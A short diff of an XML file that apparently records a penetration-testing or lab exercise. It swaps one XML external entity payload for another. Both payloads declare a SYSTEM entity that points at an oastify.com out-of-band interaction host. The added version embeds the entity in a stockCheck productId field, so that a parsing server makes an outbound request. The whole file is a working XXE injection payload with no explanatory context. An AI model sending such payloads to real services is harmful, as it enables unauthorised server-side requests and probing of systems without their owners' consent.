@@ -1,8 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-  <!ENTITY datas "hgfh">
-]>
-<!DOCTYPE foo [
- <!ENTITY send SYSTEM "http://ehz3iq4fn1p2nrgpy10cnt8hb8h1fp4.oastify.com">
-]>
-<root>&send;</root>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://zadobbx0gmingc9armtxge124tamaaz.oastify.com"> ]>
+<stockCheck>
+  <productId>&xxe;</productId>
+</stockCheck>
